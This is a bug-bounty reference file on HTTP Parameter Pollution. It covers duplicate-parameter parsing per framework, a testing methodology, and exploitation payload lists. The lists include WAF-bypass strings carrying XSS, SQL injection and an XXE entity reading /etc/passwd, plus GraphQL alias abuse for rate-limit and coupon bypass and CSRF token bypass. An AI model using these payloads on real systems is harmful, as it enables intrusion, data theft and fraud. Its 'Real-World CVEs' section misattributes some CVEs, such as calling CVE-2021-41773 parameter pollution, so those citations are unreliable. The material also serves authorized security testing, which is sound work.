---
name: "http-parameter-pollution"
version: "2.0"
category: "api"
subcategory: "hpp"
phase: "exploitation"
tags: ["bug-bounty", "duplicate-parameters", "hpp", "parameter-pollution", "access-control", "account-takeover", "api", "auth", "authorization", "bypass", "cloud", "cors", "exploitation", "fuzzing", "graphql", "idor", "iis", "information-disclosure", "js-recon", "mass-assignment", "mobile", "oauth", "path-traversal", "privesc", "session", "takeover", "token", "waf-bypass"]
tools: ["burp-suite", "param-miner", "arjun", "authz", "autorize", "burp", "graphqlmap", "grpcurl", "john", "kiterunner", "paramalyzer", "parameth", "repeater", "restler", "zap"]
follow_up_skills: ["mass-assignment", "http-request-smuggling", "csrf", "sqli", "xss", "idor-detection-exploitation"]
description: "Bug bounty skill: http parameter pollution - exploitation phase, api category"
---
# HTTP Parameter Pollution

## Summary

HTTP Parameter Pollution (HPP) is an attack where an attacker injects multiple HTTP parameters with the same name. Since no formal standard exists for parsing duplicate parameters, different technologies handle them differently — some take the first, some the last, some concatenate, some treat as an array. This inconsistency can bypass WAFs, manipulate business logic, or retrieve hidden information.

## Key Concepts

- **Duplicate parameters**: `?param=value1&param=value2`
- **Parsing inconsistency**: No standard — behavior depends on the server technology (ASP.NET, PHP, Node.js, Go, etc.)
- **Client-side HPP**: Exploits JavaScript on the browser that reads parameters
- **Server-side HPP**: Exploits how the server-side framework processes duplicates
- **WAF bypass**: A WAF may inspect only the first or last occurrence, while the backend uses a different one
- **Parameter Cloaking**: Using encoding, case, or Unicode variations to smuggle duplicate parameters past filters
- **GraphQL HPP**: Aliased queries and duplicate variables bypass per-query rate limits

## Technical Details

### Parsing Behavior by Technology

When `?par1=a&par1=b` is sent:

| Technology | Parsing Result | Outcome (`par1=`) |
|---|---|---|
| ASP.NET/IIS | All occurrences | `a,b` |
| ASP/IIS | All occurrences | `a,b` |
| Golang `r.URL.Query().Get("param")` | First | `a` |
| Golang `r.URL.Query()["param"]` | All (array) | `['a','b']` |
| IBM HTTP Server | First | `a` |
| IBM Lotus Domino | First | `a` |
| JSP/Servlet/Tomcat | First | `a` |
| mod_wsgi (Python)/Apache | First | `a` |
| Node.js `querystring` | First | `a` |
| Node.js `qs` (extended query parser) | Last / Array | `['a','b']` |
| Perl CGI/Apache | First | `a` |
| PHP/Apache | Last | `b` |
| PHP/Zeus | Last | `b` |
| Python Django | Last | `b` |
| Python Flask | First | `a` |
| Python/Zope | All (array) | `['a','b']` |
| Ruby on Rails | Last | `b` |

### Attack Surface

- **WAF evasion**: WAF checks `?id=1`, backend processes `?id=1&id=UNION SELECT...`
- **Business logic bypass**: `?amount=1&amount=5000` — frontend validates first, backend uses last
- **Authentication bypass**: `?username=attacker&username=admin` — confusion in role checks
- **Hidden parameter discovery**: Duplicating a param may reveal internal behavior or debug modes
- **Input validation bypass**: Client-side validates one value, server accepts another
- **Cookie HPP**: Add a second `user_id` parameter to the cookie (`Cookie: user_id=attacker&user_id=victim`). The server may process the second value while access control checked the first, revealing another user's data without directly changing the IDOR value.
- **API Gateway vs Backend Precedence**: Gateway picks first `id`, backend picks last `id` → IDOR/AC bypass (`/api/user?id=123&id=999`)

### Parameter Cloaking

Using encoding and case variations to bypass filters:

```
param=value1&par%61m=value2          # URL encoding
param=value1&PARAM=value2            # Case variation
param=value1&par%2561m=value2        # Double encoding
param=value1&pαram=value2            # Unicode homoglyph (Greek alpha)
param=value1&param%00=value2         # Null byte (legacy)
```

### Parameter Array Notation Pollution

Different frameworks handle array notation differently:

```
param=a&param=b                        # No brackets
param[]=a&param[]=b                    # Array notation (PHP)
param[0]=a&param[1]=b                  # Indexed (Rails)
param=single&param[]=array1&param[0]=indexed  # Mixed confusion
```

### GraphQL Parameter Pollution

```graphql
# Alias pollution — bypass rate limits
query {
  a: user(id: 1) { name email }
  b: user(id: 2) { name email }
  c: user(id: 3) { name email }
  # ... repeat to z or beyond
}

# Variable pollution
query ($id: Int!, $id: Int!) {
  user(id: $id) { name }
}

# Batch mutation pollution
mutation {
  a: redeemCoupon(code: "SAVE50") { success }
  b: redeemCoupon(code: "SAVE50") { success }
  c: redeemCoupon(code: "SAVE50") { success }
}
```

### WebSocket Parameter Pollution

WebSocket connections carry polluted parameters in the upgrade request or message payloads:

```
ws://vulnerable.com/chat?token=valid&token=malicious&room=1&room=admin
```

JSON message payload pollution:
```json
{
  "action": "sendMessage",
  "room": "public",
  "room": "admin",
  "message": "test"
}
```

### Hybrid Parameter Pollution

Combining parameters in both URL and POST body:

```
URL: https://target.com/page?parameter=url_value
POST body: parameter=body_value
```

### JSON Duplicate Key Handling

```json
{ "parameter": "value1", "parameter": "value2" }
```

Most JSON parsers accept last-wins; some gateways reject duplicates while backends accept, creating precedence gaps.

Also test HTTP header and cookie pollution:
```
Cookie: role=user; role=admin
X-Role: user
X-Role: admin
```

## Methodology

1. Identify all parameters in the request (GET, POST, cookie, header, JSON body)
2. Test duplicate parameters: `?original=value&original=test` — observe which value the server uses
3. Inject a payload in the second occurrence while keeping a benign value in the first; confirm WAF bypass if WAF uses a different parsing rule than the backend
4. Test parameter cloaking — URL encoding, case variation, double encoding, Unicode homoglyphs
5. Test array notation confusion — `param[]=a&param[]=b`, `param[0]=a&param[1]=b`, mixed notations
6. Test hybrid pollution — same parameter in URL query and POST body simultaneously
7. Test JSON duplicate keys in API requests with `Content-Type: application/json`
8. Test GraphQL alias pollution and duplicate variable definitions
9. Test WebSocket upgrade and message payload pollution
10. Test social sharing functionality for share parameter pollution (`u`, `text`, `title`, `description`)
11. Test HTTP header pollution (`Transfer-Encoding: chunked` + `Transfer-Encoding: identity`, duplicate `X-Forwarded-Proto`, duplicate `Cookie` entries)
12. Document which value the server trusts per endpoint and exploit the inconsistency

## Exploitation Payloads

### Duplicate Parameters

```
param=value1&param=value2
/app?debug=false&debug=true
/transfer?amount=1&amount=5000
/admin?admin=false&admin=true
/profile?id=attacker&id=victim
```

### Array Injection

```
param[]=value1
param[]=value1&param[]=value2
param[]=value1&param=value2
param=value1&param[]=value2
```

### Encoded Injection

```
param=value1%26other=value2
param=value1&par%61m=value2
param=value1&par%2561m=value2
```

### Nested Injection

```
param[key1]=value1&param[key2]=value2
```

### JSON Injection

```json
{
    "test": "user",
    "test": "admin"
}
```

### GraphQL Alias Pollution

```graphql
mutation {
  a: redeemCoupon(code: "SAVE50") { success }
  b: redeemCoupon(code: "SAVE50") { success }
  c: redeemCoupon(code: "SAVE50") { success }
}
```

### Social Sharing Parameters

```
https://target.com/article?u=https://attacker.com&text=malicious_text
https://target.com/share?url=safe.com&url=evil.com
```

### WAF Bypass via HPP

```
?q=safe&q=<script>alert(1)</script>
?category=1&category=1 OR 1=1
?xml=safe&xml=<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

### CSRF Token Bypass

```
?token=valid_token&token=random_value&amount=1000
```

## Tools

- **Burp Suite** — Repeater to manually test duplicate parameters and observe parsing; Repeater (Parallel) to validate precedence across layers
- **Param Miner** — Burp extension for discovering hidden parameters
- **OWASP ZAP** — HTTP fuzzer for parameter testing
- **HPP Finder** — Specialized tool for HPP vulnerability detection
- **Schemathesis** — Fuzz OpenAPI-defined endpoints for duplicate-field handling

## Bypass Techniques

- **WAF evasion**: Send benign value first, malicious second — WAF may only check the first occurrence
- **Technology mismatch**: Exploit differences between load balancer WAF and backend framework
- **Parameter array**: Use `param[]` syntax if the backend expects arrays
- **Mixed GET/POST**: Send same parameter in query string and POST body — parsing behavior may differ
- **Parameter Cloaking**: URL encoding, case changes, double encoding, Unicode homoglyphs to hide duplicate parameters from regex/string filters
- **Header/Cookie Pollution**: Duplicate cookie names and comma/semicolon handling vary by proxies/agents

## Not a Finding If

- Both frontend and backend use the same parsing rule (no inconsistency to exploit)
- The application consistently validates all occurrences of duplicate parameters
- No security decision is based on a single parameter value that could be overridden
- JSON API rejects requests with duplicate keys before they reach business logic

## Notes

- HPP is commonly paired with SQLi, XSS, or Open Redirect to bypass WAF filters
- The same principle applies to HTTP headers (HTTP Header Pollution)
- JSON HPP works in APIs that parse JSON and accept duplicate keys
- Always check the WAF technology — each has different parsing behavior just like web frameworks
- Node.js `express` uses either `querystring` (first-wins) or `qs` (arrays/last-wins) — `app.set('query parser', 'extended')` changes behavior
- Spring MVC/Spring Boot binders often collect duplicates into lists; API gateways (Kong, APIGEE, NGINX, Cloudflare) may collapse/normalize differently than backends
- GraphQL aliased queries bypass per-query rate limits — always test alias pollution
- Social sharing button parameters (`u`, `url`, `text`) are common HPP targets in bug bounties

### Real-World CVEs

- **CVE-2021-41773** — Apache HTTP Server path traversal via parameter pollution in URL path normalization
- **CVE-2018-8033** — Apache OFBiz authentication bypass via duplicate parameters in login form
- **OAuth HPP (Multiple Vendors)** — Duplicate `redirect_uri` parameters: gateway checked first, backend used last
- **API Gateway Precedence (Bug Bounty)** — AWS API Gateway processed first `id`, Lambda backend processed last — IDOR to other users' data
- **GraphQL Rate Limit Bypass (Multiple Platforms)** — Aliased queries bypassed per-query rate limits

## References

- https://owasp.org/www-community/attacks/HTTP_Parameter_Pollution
- https://portswigger.net/web-security/parameter-pollution
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/HTTP%20Parameter%20Pollution
